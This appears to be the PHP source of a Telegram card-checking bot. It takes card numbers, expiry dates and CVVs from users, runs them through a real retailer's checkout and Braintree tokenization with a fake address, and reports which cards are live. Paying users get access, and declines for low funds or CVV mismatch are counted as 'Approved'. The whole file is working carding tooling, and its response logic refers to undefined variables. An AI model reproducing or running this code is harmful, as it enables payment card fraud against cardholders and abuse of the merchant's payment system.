<?php
//=========RANK DETERMINE=========//
$gate = "Braintree 1$ Avs";
$currentDate = date('Y-m-d');
$rank = "FREE";
$expiryDate = "0";

$paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
$freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
$owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

if (in_array($userId, $owners)) {
    $rank = "OWNER";
    $expiryDate = "UNTIL DEAD";
} else {
    foreach ($paidUsers as $index => $line) {
        list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
        if ($userIdFromFile == $userId) {
            if ($userExpiryDate < $currentDate) {
                unset($paidUsers[$index]); //
                file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                $freeUsers[] = $userId; // add to free users list
                file_put_contents('Database/free.txt', implode("\n", $freeUsers));
            } else    $currentDate = date('Y-m-d');
            $rank = "FREE";
            $expiryDate = "0";

            $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
            $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
            $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

            if (in_array($userId, $owners)) {
                $rank = "OWNER";
                $expiryDate = "UNTIL DEAD";
            } else {
                foreach ($paidUsers as $index => $line) {
                    list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
                    if ($userIdFromFile == $userId) {
                        if ($userExpiryDate < $currentDate) {
                            unset($paidUsers[$index]);
                            file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                            $freeUsers[] = $userId;
                            file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                        } else {
                            $rank = "PAID";
                            $expiryDate = $userExpiryDate;
                        }
                    }
                }
            } {
                $rank = "PAID";
                $expiryDate = $userExpiryDate;
            }
        }
    }
}

//=======RANK DETERMINE END=========//
$update = json_decode(file_get_contents("php://input"), TRUE);
$text = $update["message"]["text"];
//========WHO CAN CHECK FUNC========//
$r = "0";
$gcm = "/ba";
$r = rand(0, 100);
//=====WHO CAN CHECK FUNC END======//
if (preg_match('/^(\/bv|\.bv|!bv)/', $text)) {
    $userid = $update['message']['from']['id'];

    if (!checkAccess($userid)) {
        $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b> @$username You're not Premium user❌</b>", $message_id);
        exit();
    }
    $start_time = microtime(true);

    $chatId = $update["message"]["chat"]["id"];
    $message_id = $update["message"]["message_id"];
    $keyboard = "";
    $message = substr($message, 4);
    $messageidtoedit1 = bot('sendmessage', [
        'chat_id' => $chat_id,
        'text' => "<b>REVIEWING YOU'RE REQUEST ✅</b>",
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id
    ]);
    $messageidtoedit = Getstr(json_encode($messageidtoedit1), '"message_id":', ',');

    $cc = multiexplode(array(":", "/", " ", "|"), $message)[0];
$c1 = substr($cc, 0, 4); 
$c2 = substr($cc, 4, 4); 
$c3 = substr($cc, 8, 4); 
$c4 = substr($cc, -4);
    $mes = multiexplode(array(":", "/", " ", "|"), $message)[1];
    $ano = multiexplode(array(":", "/", " ", "|"), $message)[2];
    $cvv = multiexplode(array(":", "/", " ", "|"), $message)[3];
    $amt = '1';
    if (empty($cc) || empty($cvv) || empty($mes) || empty($ano)) {
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $messageidtoedit,
            'text' => "!𝙔𝙤𝙪 𝘿𝙪𝙢𝙗𝙤 𝘼𝙨𝙨 𝙃𝙤𝙡𝙚!\n𝙏𝙚𝙭𝙩 𝙎𝙝𝙤𝙪𝙡𝙙 𝙊𝙣𝙡𝙮 𝘾𝙤𝙣𝙩𝙖𝙞𝙣 - <code>$gcm cc|mm|yy|cvv</code>\n𝙂𝙖𝙩𝙚𝙬𝙖𝙮 - <b>$gate</b>",
            'parse_mode' => 'html',
            'disable_web_page_preview' => 'true'
        ]);
        return;
    };
    if (strlen($ano) == '4') {
        $an = substr($ano, 2);
    } else {
        $an = $ano;
    }
    $amount = $amt * 100;
    //------------Card info------------//
    $lista = '' . $cc . '|' . $mes . '|' . $an . '|' . $cvv . '';

      $ch = curl_init();

      $bin = substr($cc, 0, 6);

      curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/' . $bin . '/');
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        $ch = curl_init();

        $bin = substr($cc, 0, 6);

        curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/' . $bin . '/');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $bindata = curl_exec($ch);
        $binna = json_decode($bindata, true);
        $brand = $binna['scheme'];
        $country = $binna['country']['name'];
        $alpha2 = $binna['country']['alpha2'];
        $emoji = $binna['country']['emoji'];
        $type = $binna['type'];
        $category = $binna['category'];
        $bank = $binna['bank']['name'];
        $url = $binna['bank']['url'];
        $phone = $binna['bank']['phone'];
        curl_close($ch);

        $bank = "$bank";
        $country = "$country $emoji ";
        $bin = "$bin - ($alpha2) -[$emoji] ";
        $bininfo = "$type - $brand - $category";
        $url = "$url";
        $type = strtoupper($type);


  bot('editMessageText', [
          'chat_id' => $chat_id,
          'message_id' => $messageidtoedit,
          'text' => "<b>[×] PROCESS - ■□□□
- - - - - - - - - - - - - - - - - - -
[×] CARD ↯ <code>$lista</code>
[×] GATEWAY ↯ $gate
[×] BANK ↯ $bank
[×] TYPE ↯ $bininfo
[×] COUNTRY ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| MAXIMUM TIME ↯ 25 SEC
|×| REQ BY ↯ @$username</b>",
        'parse_mode' => 'html',
          'disable_web_page_preview' => 'true'
      ]);



    $proxie = null;
    $pass = null;
    $cookieFile = getcwd() . '/cookies.txt';

    function getstr2($string, $start, $end)
    {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.litter-robot.com/checkout/cart/add/uenc/aHR0cHM6Ly93d3cubGl0dGVyLXJvYm90LmNvbS9zaG9wLWFsbC1wcm9kdWN0cy9scjMtcGluY2guaHRtbA%2C%2C/product/211/');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'Origin: https://www.litterbox.com',
'Referer: https://www.litterbox.com/shop-all.html',
'cookie: form_key='.$formkey.'; form_key='.$formkey.';',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, array(
    'product' => '211',
    'selected_configurable_option' => '',
    'related_product' => '',
    'item' => '211',
    'form_key' => ''.$formkey.'',
    'qty' => '1',
));
$curl2 = curl_exec($ch);


    bot('editMessageText', [
          'chat_id' => $chat_id,
          'message_id' => $messageidtoedit,
          'text' => "<b>[×] PROCESS - ■■□□
- - - - - - - - - - - - - - - - - - -
[×] CARD ↯ <code>$lista</code>
[×] GATEWAY ↯ $gate
[×] BANK ↯ $bank
[×] TYPE ↯ $bininfo
[×] COUNTRY ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| MAXIMUM TIME ↯ 25 SEC
|×| REQ BY ↯ @$username</b>",
        'parse_mode' => 'html',
          'disable_web_page_preview' => 'true'
      ]);

#02 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.litter-robot.com/checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
'content-type: application/x-www-form-urlencoded',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
$curl3 = curl_exec($ch);
$EID = trim(strip_tags(getStr($curl3,'entity_id":"','"')));
$CT = trim(strip_tags(getStr($curl3,'clientToken":"','"')));
$decode = base64_decode($CT);
$fpt = trim(strip_tags(getStr($decode,'authorizationFingerprint":"','"')));

# 05 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.litter-robot.com/rest/litterrobot/V1/guest-carts/'.$EID.'/shipping-information');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/json',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"addressInformation":{"shipping_address":{"countryId":"US","regionId":"36","regionCode":"MO","region":"Missouri","street":["8700 NW River Park Dr"],"company":"","telephone":"4254353455","postcode":"64152-4358","city":"Parkville","firstname":"Jack","lastname":"Coddrey"},"billing_address":{"countryId":"US","regionId":"36","regionCode":"MO","region":"Missouri","street":["8700 NW River Park Dr"],"company":"","telephone":"4254353455","postcode":"64152-4358","city":"Parkville","firstname":"Jack","lastname":"Coddrey","saveInAddressBook":null},"shipping_method_code":"Flat_Rate","shipping_carrier_code":"shqcustom","extension_attributes":{}}}');
$curl5 = curl_exec($ch);
echo "CURL5 - ($curl5)";

# 07 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/json',
'braintree-version: 2018-05-10',
'authorization: Bearer '.$fpt.'',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"c990cb1d-f645-41c5-8050-011c0ce4651f"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$curl7 = curl_exec($ch);
$pid = trim(strip_tags(getStr($curl7,'token":"','"')));

# 08 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.litter-robot.com/rest/litterrobot/V1/guest-carts/'.$EID.'/payment-information');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/json',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cartId":"'.$EID.'","billingAddress":{"countryId":"US","regionId":"36","regionCode":"MO","region":"Missouri","street":["8700 NW River Park Dr"],"company":"","telephone":"4254353455","postcode":"64152-4358","city":"Parkville","firstname":"Jack","lastname":"Coddrey","saveInAddressBook":null},"paymentMethod":{"method":"braintree","additional_data":{"payment_method_nonce":"'.$pid.'","g-recaptcha-response":"<SOL>","device_data":"{\"correlation_id\":\"6b8920809f0cdd54f325801a17f79828\"}"},"extension_attributes":{"agreement_ids":["1"]}},"email":"'.$email.'"}');
$curl8 = curl_exec($ch);

$rsppppp = trim(strip_tags(getStr($curl8,'Your payment could not be taken. Please try again or use a different payment method. ','"')));

  bot('editMessageText', [
          'chat_id' => $chat_id,
          'message_id' => $messageidtoedit,
          'text' => "<b>[×] PROCESS - ■■■□
- - - - - - - - - - - - - - - - - - -
[×] CARD ↯ <code>$lista</code>
[×] GATEWAY ↯ $gate
[×] BANK ↯ $bank
[×] TYPE ↯ $bininfo
[×] COUNTRY ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| MAXIMUM TIME ↯ 25 SEC
|×| REQ BY ↯ @$username</b>",
        'parse_mode' => 'html',
          'disable_web_page_preview' => 'true'
      ]);



  bot('editMessageText', [
          'chat_id' => $chat_id,
          'message_id' => $messageidtoedit,
          'text' => "<b>[×] PROCESS - ■■■■
- - - - - - - - - - - - - - - - - - -
[×] CARD ↯ <code>$lista</code>
[×] GATEWAY ↯ $gate
[×] BANK ↯ $bank
[×] TYPE ↯ $bininfo
[×] COUNTRY ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| MAXIMUM TIME ↯ 25 SEC
|×| REQ BY ↯ @$username</b>",
        'parse_mode' => 'html',
          'disable_web_page_preview' => 'true'
      ]);

$msg = $rsppppp;


    

      if (strpos($curl4, 'status":"submitted_for_settlement')){

        $es = '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅';
        $rsp = "Thanks For Purchase!";
        $avs = "$avsrsp";
      }
        elseif (empty($msg) && $cvvResponseCode === 'M') {
    $es = '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅';
    $rsp = 'Thanks For Purchase!';
    $avs = "$avsrsp";      

}elseif ((strpos($curl4, 'Gateway Rejected: avs')) || (strpos($curl4, 'Gateway Rejected: avs'))){
    $es = '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅';
    $rsp = "$rspppp";
   $avs = "$avsrsp";

    }  elseif ((strpos($curl4, 'Card Issuer Declined CVV')) || (strpos($curl4, 'Card Issuer Declined CVV'))){

        $es = '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅';
        $rsp = "$rsppppp";
        $avs = "$avsrsp";

  }  elseif ((strpos($curl4, 'Insufficient Funds')) || (strpos($curl4, 'Insufficient'))){
        $es = '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅';
        $rsp = "$rsppppp";
        $avs = "$avsrsp";

    } else {
        $es = '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌';
        $rsp = "$rsppppp";
        $avs = "$avsrsp";

    }

    echo "<br>$es--$msg";


    $end_time = microtime(true);
    $time = number_format($end_time - $start_time, 2);
    ////////--[Responses]--////////


    bot('editMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $messageidtoedit,
        'text' => "$es

𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ <code>$gate</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ <code>$msg $rsppppp</code>
𝐂𝐨𝐝𝐞 ↯ <b>$avs</b>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$bininfo</code> 
𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$country</code>

𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
$botu
",
        'parse_mode' => 'html',
        'disable_web_page_preview' => 'true'
    ]);
}
